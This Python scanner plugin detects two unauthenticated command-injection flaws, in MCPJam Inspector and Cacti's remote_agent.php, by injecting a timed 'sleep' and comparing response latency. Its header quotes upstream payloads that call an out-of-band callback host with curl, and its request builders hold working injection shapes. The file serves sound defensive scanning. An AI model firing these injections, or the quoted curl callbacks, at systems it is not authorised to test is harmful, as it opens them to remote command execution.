"""
OOB-independent, time-based blind OS command-injection probe for recent-CVE
products whose upstream nuclei templates are interactsh/OAST-only.

WHY THIS EXISTS (issue #321, Epic #315 — GATE A complement, NOT a duplicate):
The shipped nuclei templates for these CVEs confirm exploitation ONLY via an
out-of-band interactsh callback:
  * ``http/cves/2026/CVE-2026-23744.yaml`` (MCPJam Inspector) — payload
    ``{"serverConfig":{"command":"curl","args":["{{interactsh-url}}"]…}}`` with a
    ``contains(interactsh_protocol,"dns")`` matcher.
  * ``http/cves/2022/CVE-2022-46169.yaml`` (Cacti ``remote_agent.php``) —
    ``poller_id=;curl {{interactsh-url}};`` with interactsh matchers.
On an EGRESS-FILTERED / air-gapped scanner (xASM local Docker agents have no
outbound internet) nuclei cannot register or poll interactsh, so those templates
**cannot fire even when the agent CAN reach the box**. This probe confirms the
exact same command-injection sinks with a **benign timing oracle** (``sleep``)
that needs no callback — the air-gap-viable detection the issue's acceptance
criterion ("benign/timing assertion") actually asks for.

It is a CVE-SIGNATURE detector, not a generic fuzzer: it only injects the two
known recent-CVE shapes (MCPJam POST-JSON ``command``/``args`` body; Cacti
``remote_agent.php`` ``poller_id`` GET param). Generic query/form command-
injection fuzzing stays with ``commix:*`` (issue #322).

SAFETY: the ONLY command ever sent is ``sleep`` (and ``sleep 0`` as the control).
No shell, no ``curl``, no reverse shell, no exfil — structurally (the body/URL
builders cannot emit anything else). Findings are nuclei-shaped so backend
ingestion reuses ``processNucleiOutput``; ``info.cve`` carries the CVE so the
finding collapses (cross-source ``primaryCve`` dedup) with the OOB-template
finding on any internet-connected scan instead of double-reporting.
"""

import asyncio
import json
import time
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlencode, urlparse

import aiohttp

from plugin_interface import ToolPlugin
from tools._agentic_exploration_common import normalize_url, parse_headers


# Endpoint signatures probed by default. Mode is inferred from the path:
#  * ``remote_agent.php``           -> Cacti GET-param injection (CVE-2022-46169)
#  * anything else (mcp/connect …)  -> MCPJam POST-JSON body injection (CVE-2026-23744)
DEFAULT_ENDPOINTS = [
    "/api/mcp/connect",          # MCPJam Inspector — CVE-2026-23744
    "/cacti/remote_agent.php",   # Cacti — CVE-2022-46169 (typical sub-path install)
    "/remote_agent.php",         # Cacti — CVE-2022-46169 (root install)
]

# Per-endpoint CVE metadata keyed by the inferred mode.
CVE_META = {
    "mcpjam": {
        "cve": "CVE-2026-23744",
        "name": "MCPJam Inspector — Unauthenticated OS Command Injection (time-based)",
        "product": "MCPJam Inspector",
        "description": (
            "The MCP server-connect endpoint passes a JSON command/args straight to "
            "Node child_process.spawn() with no authentication or allow-list. An "
            "unauthenticated attacker achieves arbitrary OS command execution. Confirmed "
            "here air-gapped via a benign time-based oracle: an injected `sleep` delayed "
            "the response while the `sleep 0` control did not — no out-of-band callback "
            "required (the OOB-only upstream nuclei template cannot fire on an "
            "egress-filtered scanner)."
        ),
        "remediation": (
            "Upgrade MCPJam Inspector to 1.4.3+ and bind it to 127.0.0.1; require "
            "authentication and an explicit command allow-list before spawning processes."
        ),
        "reference": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-23744",
            "https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6",
        ],
        "tags": ["cve", "cve2026", "rce", "command-injection", "mcpjam", "time-based"],
    },
    "cacti": {
        "cve": "CVE-2022-46169",
        "name": "Cacti remote_agent.php — Unauthenticated OS Command Injection (time-based)",
        "product": "Cacti",
        "description": (
            "Cacti's remote_agent.php poll path is reachable by a spoofable guest poller "
            "and concatenates poller_id into a shell command (CVE-2022-46169), yielding "
            "unauthenticated OS command execution. Confirmed here air-gapped via a benign "
            "time-based oracle (injected `sleep` delayed the response vs the control) — no "
            "out-of-band callback required."
        ),
        "remediation": (
            "Upgrade Cacti to a patched release, require authentication for poller "
            "endpoints, and restrict access to remote_agent.php."
        ),
        "reference": [
            "https://nvd.nist.gov/vuln/detail/CVE-2022-46169",
            "https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf",
        ],
        "tags": ["cve", "cve2022", "rce", "command-injection", "cacti", "time-based"],
    },
}

# Content-validation: an injected response that is a full HTML document / SPA
# catch-all is NEVER a real MCP/Cacti command sink (rejects timing FPs on a
# slow-rendering front-end). Markers that POSITIVELY corroborate a real sink:
HTML_MARKERS = ("<!doctype html", "<html", "<head>", "<body", "<title")
MCPJAM_BODY_MARKERS = (
    "connection failed for server",
    "mcp error",
    "spawn",
    "enoent",
    "child_process",
    "transport",
    "serverid",
    "error",
)


class WebCommandInjectionTimingProbeTool(ToolPlugin):
    @property
    def name(self) -> str:
        return "web:command_injection_timing_probe"

    @property
    def description(self) -> str:
        return (
            "OOB-independent time-based blind OS command-injection probe for recent-CVE "
            "products whose upstream nuclei templates are interactsh-only (MCPJam "
            "CVE-2026-23744 POST-JSON body; Cacti CVE-2022-46169 remote_agent.php). "
            "Sends only a benign `sleep` oracle; emits Nuclei-shaped CVE findings."
        )

    @property
    def schema(self) -> Dict[str, Any]:
        return {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "Base URL of the target (e.g. http://kobold.htb/).",
                },
                "endpoints": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": (
                        "Endpoint paths to probe. Mode is inferred from the path "
                        "(remote_agent.php -> Cacti GET; else MCPJam POST-JSON). "
                        f"Default: {DEFAULT_ENDPOINTS}"
                    ),
                },
                "sleepSeconds": {
                    "type": "integer",
                    "description": "Injected sleep duration used as the timing oracle (default 5).",
                    "default": 5,
                    "minimum": 2,
                    "maximum": 15,
                },
                "maxBaselineSeconds": {
                    "type": "number",
                    "description": "Reject endpoints whose control response is already slower than this (always-slow control; default 3.0).",
                    "default": 3.0,
                },
                "timeoutSeconds": {
                    "type": "integer",
                    "description": "Per-request timeout (default: sleepSeconds*2 + 8).",
                },
                "authHeaders": {
                    "type": "object",
                    "description": "Extra request headers (e.g. an auth token).",
                    "x-hidden": True,
                },
                "authCookies": {
                    "type": "string",
                    "description": "Session cookies (format: 'name1=value1; name2=value2').",
                    "x-hidden": True,
                },
            },
            "required": ["target"],
        }

    @property
    def metadata(self):
        return {
            "category": "exploit-test",
            "phase": 5,
            "domain": ["web"],
            "input_type": ["url"],
            "output_type": ["findings"],
            "chainable_after": ["httpx:", "katana:", "nuclei:", "decision:"],
            "chainable_before": ["nuclei:", "decision:"],
        }

    async def execute(self, parameters: Dict[str, Any]) -> Any:
        target = normalize_url(parameters.get("target") or parameters.get("url") or "")
        if not target:
            return {"success": False, "error": "target is required"}
        parsed = urlparse(target)
        if parsed.scheme not in {"http", "https"} or not parsed.netloc:
            return {"success": False, "error": f"target must be an http(s) URL: {target}"}

        sleep_seconds = max(2, min(int(parameters.get("sleepSeconds") or 5), 15))
        max_baseline = float(parameters.get("maxBaselineSeconds") or 3.0)
        timeout_seconds = int(parameters.get("timeoutSeconds") or (sleep_seconds * 2 + 8))
        endpoints = parameters.get("endpoints")
        if not isinstance(endpoints, list) or not endpoints:
            endpoints = list(DEFAULT_ENDPOINTS)

        headers = {**parse_headers(parameters), "Accept": "*/*"}
        agent = parameters.get("_agent")
        origin = f"{parsed.scheme}://{parsed.netloc}"

        results: List[Dict[str, Any]] = []
        findings: List[Dict[str, Any]] = []
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=timeout_seconds + 5),
        ) as session:
            for index, endpoint in enumerate(endpoints, 1):
                path = endpoint if str(endpoint).startswith("/") else f"/{endpoint}"
                url = f"{origin}{path}"
                mode = "cacti" if "remote_agent.php" in path.lower() else "mcpjam"
                if agent:
                    agent.report_progress(
                        "Time-based command-injection probe", url, index - 1, len(endpoints)
                    )
                try:
                    outcome = await self._probe_endpoint(
                        session, url, mode, headers, sleep_seconds, max_baseline, timeout_seconds
                    )
                except Exception as exc:  # never let one endpoint abort the run
                    outcome = {"detected": False, "error": str(exc)[:300]}
                outcome["endpoint"] = url
                outcome["mode"] = mode
                results.append(outcome)
                if outcome.get("detected"):
                    findings.append(self._finding_for(url, mode, outcome, sleep_seconds))

        raw_output = "\n".join(self._finding_line(f) for f in findings)
        return {
            "success": True,
            "target": target,
            "tool": self.name,
            "findings": findings,
            "total_findings": len(findings),
            "results": results,
            "rawOutput": raw_output,
            "raw_output": raw_output,
            "summary": {
                "endpointsProbed": len(results),
                "detections": len(findings),
            },
        }

    async def _probe_endpoint(
        self,
        session: aiohttp.ClientSession,
        url: str,
        mode: str,
        headers: Dict[str, str],
        sleep_seconds: int,
        max_baseline: float,
        timeout_seconds: int,
    ) -> Dict[str, Any]:
        """Baseline -> inject -> confirm timing oracle with content validation."""
        strategies = self._strategies(mode)
        for strat in strategies:
            # Control (sleep 0 / non-injected) — establishes normal latency + plausibility.
            base = await self._timed_request(session, url, headers, strat, 0, timeout_seconds)
            if base.get("status") is None:
                continue  # transport error for this strategy; try next
            if not self._is_plausible(mode, base):
                continue  # not the real sink shape (e.g. 404 HTML / SPA catch-all)
            if base["elapsed"] > max_baseline:
                # Endpoint is already slow for the control — refuse to infer timing.
                return {
                    "detected": False,
                    "reason": "always-slow control",
                    "baseline": round(base["elapsed"], 2),
                }
            # Injection (sleep N).
            inj = await self._timed_request(session, url, headers, strat, sleep_seconds, timeout_seconds)
            if inj.get("status") is None and not inj.get("timedOut"):
                continue
            delta = inj["elapsed"] - base["elapsed"]
            if not (delta >= sleep_seconds * 0.6 and delta >= sleep_seconds - 1.5):
                continue
            if not self._is_plausible(mode, inj):
                continue
            # Confirm re-run (defeats one-off VPN jitter).
            conf = await self._timed_request(session, url, headers, strat, sleep_seconds, timeout_seconds)
            conf_delta = conf["elapsed"] - base["elapsed"]
            if not (conf_delta >= sleep_seconds * 0.6):
                continue
            return {
                "detected": True,
                "strategy": strat["label"],
                "baseline": round(base["elapsed"], 2),
                "injected": round(inj["elapsed"], 2),
                "delta": round(delta, 2),
                "confirmDelta": round(conf_delta, 2),
                "status": inj["status"],
                "request": inj["request"],
                "response": inj["response"],
                "curl": inj["curl"],
            }
        return {"detected": False, "reason": "no timing delta on any strategy"}

    def _strategies(self, mode: str) -> List[Dict[str, Any]]:
        if mode == "cacti":
            return [{"label": "remote_agent.php poller_id", "kind": "get"}]
        # MCPJam — try the advisory serverConfig shape first, then the simple shape.
        return [
            {"label": "POST /api/mcp/connect serverConfig", "kind": "post", "shape": "serverConfig"},
            {"label": "POST /api/mcp/connect simple", "kind": "post", "shape": "simple"},
        ]

    async def _timed_request(
        self,
        session: aiohttp.ClientSession,
        url: str,
        headers: Dict[str, str],
        strat: Dict[str, Any],
        seconds: int,
        timeout_seconds: int,
    ) -> Dict[str, Any]:
        method, request_url, json_body, body_str = self._build_request(url, strat, seconds)
        req_headers = dict(headers)
        if json_body is not None:
            req_headers["Content-Type"] = "application/json"
        start = time.monotonic()
        timed_out = False
        status: Optional[int] = None
        body_text = ""
        content_type = ""
        try:
            timeout = aiohttp.ClientTimeout(total=timeout_seconds)
            async with session.request(
                method, request_url, headers=req_headers, data=body_str,
                allow_redirects=False, timeout=timeout,
            ) as response:
                status = response.status
                content_type = str(response.headers.get("content-type") or "").lower()
                raw = await response.content.read(8192)
                body_text = raw.decode("utf-8", errors="replace")
        except asyncio.TimeoutError:
            timed_out = True
        except Exception:
            return {"status": None, "elapsed": time.monotonic() - start, "timedOut": False}
        elapsed = time.monotonic() - start
        return {
            "status": status,
            "elapsed": elapsed,
            "timedOut": timed_out,
            "contentType": content_type,
            "body": body_text,
            "request": self._request_transcript(method, request_url, req_headers, body_str),
            "response": self._response_transcript(status, content_type, body_text, timed_out),
            "curl": self._curl_command(method, request_url, req_headers, body_str),
        }

    def _build_request(
        self, url: str, strat: Dict[str, Any], seconds: int
    ) -> Tuple[str, str, Optional[Dict[str, Any]], Optional[str]]:
        """Construct the request. ONLY ever emits a `sleep <n>` command — no shell/exfil."""
        s = str(int(seconds))
        if strat["kind"] == "get":
            # Cacti remote_agent.php — inject the benign sleep into poller_id.
            poller = "1" if seconds == 0 else f";sleep {s};"
            query = [
                ("action", "polldata"),
                ("local_data_ids[0]", "1"),
                ("host_id", "1"),
                ("poller_id", poller),
            ]
            return "GET", f"{url}?{urlencode(query)}", None, None
        # MCPJam POST-JSON — sleep as the spawned command.
        if strat.get("shape") == "serverConfig":
            body = {
                "serverConfig": {"timeout": 20000, "command": "sleep", "args": [s], "env": {}},
                "serverId": "xasm-probe",
            }
        else:
            body = {"name": "xasm-probe", "command": "sleep", "args": [s]}
        return "POST", url, body, json.dumps(body)

    def _is_plausible(self, mode: str, resp: Dict[str, Any]) -> bool:
        """Reject SPA/HTML catch-alls and missing endpoints; corroborate the real sink shape."""
        if resp.get("timedOut"):
            return True  # a timeout on the injected call is itself a strong timing signal
        status = resp.get("status")
        if status is None or status in (404, 405):
            return False
        body = str(resp.get("body") or "")
        lowered = body.strip().lower()
        content_type = str(resp.get("contentType") or "")
        is_html = "text/html" in content_type or any(m in lowered[:512] for m in HTML_MARKERS)
        if mode == "mcpjam":
            if "json" in content_type:
                return True
            if status in (400, 422, 500, 502, 503):
                return True
            if any(m in lowered for m in MCPJAM_BODY_MARKERS):
                return True
            return not is_html
        # Cacti remote_agent.php returns XML/short text (or a FATAL auth string), never a full SPA.
        return not is_html

    def _finding_for(
        self, url: str, mode: str, outcome: Dict[str, Any], sleep_seconds: int
    ) -> Dict[str, Any]:
        meta = CVE_META[mode]
        extracted = [
            f"endpoint={urlparse(url).path}",
            f"injected-command=sleep {sleep_seconds}",
            f"baseline={outcome.get('baseline')}s",
            f"injected={outcome.get('injected')}s",
            f"delta={outcome.get('delta')}s",
            f"confirm-delta={outcome.get('confirmDelta')}s",
            f"strategy={outcome.get('strategy')}",
        ]
        finding = {
            "template-id": meta["cve"],
            "templateID": meta["cve"],
            "matched-at": url,
            "matched": url,
            "host": url,
            "matcher-name": "time-based-blind-command-injection",
            "extracted-results": extracted,
            "info": {
                "name": meta["name"],
                "severity": "critical",
                "description": meta["description"],
                "remediation": meta["remediation"],
                "cve": [meta["cve"]],
                "reference": meta["reference"],
                "tags": meta["tags"],
                "classification": {"cve-id": meta["cve"]},
            },
        }
        if outcome.get("request"):
            finding["request"] = outcome["request"]
        if outcome.get("response"):
            finding["response"] = outcome["response"]
        if outcome.get("curl"):
            finding["curl-command"] = outcome["curl"]
        return finding

    def _finding_line(self, finding: Dict[str, Any]) -> str:
        info = finding.get("info") or {}
        return f"[{str(info.get('severity', 'info')).upper()}] {info.get('name')} - {finding.get('matched-at')}"

    # --- transcript helpers (auth headers redacted; only a benign `sleep` payload shown) ---
    def _request_transcript(self, method: str, url: str, headers: Dict[str, str], body: Optional[str]) -> str:
        parsed = urlparse(url)
        request_target = parsed.path or "/"
        if parsed.query:
            request_target = f"{request_target}?{parsed.query}"
        lines = [f"{method} {request_target} HTTP/1.1", f"Host: {parsed.netloc}"]
        for name, value in sorted(headers.items()):
            if name.lower() == "host":
                continue
            lines.append(f"{name}: {self._redact_header(name, str(value))}")
        transcript = "\r\n".join(lines) + "\r\n\r\n"
        if body:
            transcript += body
        return transcript

    def _response_transcript(self, status: Optional[int], content_type: str, body: str, timed_out: bool) -> str:
        if timed_out:
            return "HTTP — request timed out (server held the connection for the injected sleep duration)"
        excerpt = (body or "")[:512]
        return f"HTTP {status} ({content_type})\r\n\r\n{excerpt}"

    def _curl_command(self, method: str, url: str, headers: Dict[str, str], body: Optional[str]) -> str:
        parts = ["curl", "-i", "-sS", "-X", method]
        for name, value in sorted(headers.items()):
            parts.extend(["-H", self._shell_quote(f"{name}: {self._redact_header(name, str(value))}")])
        if body:
            parts.extend(["--data", self._shell_quote(body)])
        parts.append(self._shell_quote(url))
        return " ".join(parts)

    def _redact_header(self, name: str, value: str) -> str:
        if name.lower() in {"authorization", "cookie", "x-api-key", "proxy-authorization"}:
            return "[REDACTED]"
        return value

    def _shell_quote(self, value: str) -> str:
        return "'" + value.replace("'", "'\"'\"'") + "'"


def get_tool():
    return WebCommandInjectionTimingProbeTool()
